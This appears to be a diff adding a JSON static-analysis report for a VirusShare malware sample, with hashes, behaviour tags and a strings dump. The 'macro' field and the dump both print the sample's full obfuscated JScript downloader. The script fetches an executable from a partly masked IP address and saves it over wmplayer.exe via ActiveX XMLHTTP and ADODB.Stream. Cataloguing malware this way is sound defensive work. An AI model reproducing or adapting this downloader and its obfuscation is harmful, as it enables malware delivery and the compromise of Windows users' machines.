@@ -1,0 +1,60 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Open": "May open a file",
+            "SaveToFile": "May create a text file",
+            "Write": "May write to a file"
+        },
+        "macro": "\nvar szExt = unescape(\"%2E%65%78%65\");\nvar szM = unescape(\"%6D\");\nvar szMMS = szM + szM + \"s://\";\nvar szSTR=  unescape(\"%53%74%72%65%61%6D\");\nvar szADO    = unescape(\"%41%44%4F%44%42%2E\")    + szSTR;\nvar szMS = \"Microsoft\"; var szWIN = unescape(\"%57%69%6E%64%6F%77%73\");\nvar szHTTP = szMS + unescape(\"%2E%58%4D%4C%48%54%54%50\");\nvar HTTP  =  new ActiveXObject(szHTTP); var METHOD =\nunescape(\"%47%45%54\");\nvar xx1=unescape(\"%4D%65%64%69%61\"); var xx2 =\nunescape(\"%50%6C%61%79%65%72\");\nvar MP1=unescape(\"%43%3A%5C%5C%50%72%6F%67%72%61%6D\"); var MP2 = \" \" + xx1\n+ \" \" + xx2;\nvar szPL = \"pl\";\nvar MP = MP1 + \" Files\\\\\" + szWIN + MP2 + \"\\\\wm\" + szPL +\nunescape(\"%61%79%65%72\") + szExt;\nvar szURL = \"http://217.107.218.***/msits.exe\";\nvar i = 8 - 5;\nvar t = 7 - 6; HTTP.Open(METHOD, szURL, i-3); HTTP.Send();\nvar ADO = new ActiveXObject(szADO);\nADO.Mode = i; ADO.Type = t;\nADO.Open(); ADO.Write(HTTP.responseBody);\nADO.SaveToFile(MP, i-t); location.href=szMMS;"
+    },
+    "filename": "VirusShare_060f816b509e612f1c188f2d2f00ab2b",
+    "filesize": 977,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "060f816b509e612f1c188f2d2f00ab2b",
+        "sha1": "7e74ba867d9120e2a4fcdac760aef8e59e97f061",
+        "sha256": "9be32cdd8b65bed9296ea1c325b135c30a330de8cd1e4d0acacd2f2101f62688"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "var szExt = unescape(\"%2E%65%78%65\");",
+            "var szM = unescape(\"%6D\");",
+            "var szMMS = szM + szM + \"s://\";",
+            "var szSTR=  unescape(\"%53%74%72%65%61%6D\");",
+            "var szADO    = unescape(\"%41%44%4F%44%42%2E\")    + szSTR;",
+            "var szMS = \"Microsoft\"; var szWIN = unescape(\"%57%69%6E%64%6F%77%73\");",
+            "var szHTTP = szMS + unescape(\"%2E%58%4D%4C%48%54%54%50\");",
+            "var HTTP  =  new ActiveXObject(szHTTP); var METHOD =",
+            "unescape(\"%47%45%54\");",
+            "var xx1=unescape(\"%4D%65%64%69%61\"); var xx2 =",
+            "unescape(\"%50%6C%61%79%65%72\");",
+            "var MP1=unescape(\"%43%3A%5C%5C%50%72%6F%67%72%61%6D\"); var MP2 = \" \" + xx1",
+            "+ \" \" + xx2;",
+            "var szPL = \"pl\";",
+            "var MP = MP1 + \" Files\\\\\" + szWIN + MP2 + \"\\\\wm\" + szPL +",
+            "unescape(\"%61%79%65%72\") + szExt;",
+            "var szURL = \"http://217.107.218.***/msits.exe\";",
+            "var i = 8 - 5;",
+            "var t = 7 - 6; HTTP.Open(METHOD, szURL, i-3); HTTP.Send();",
+            "var ADO = new ActiveXObject(szADO);",
+            "ADO.Mode = i; ADO.Type = t;",
+            "ADO.Open(); ADO.Write(HTTP.responseBody);",
+            "ADO.SaveToFile(MP, i-t); location.href=szMMS;"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://217.107.218."
+        ]
+    },
+    "time": "0:00:00.272519",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
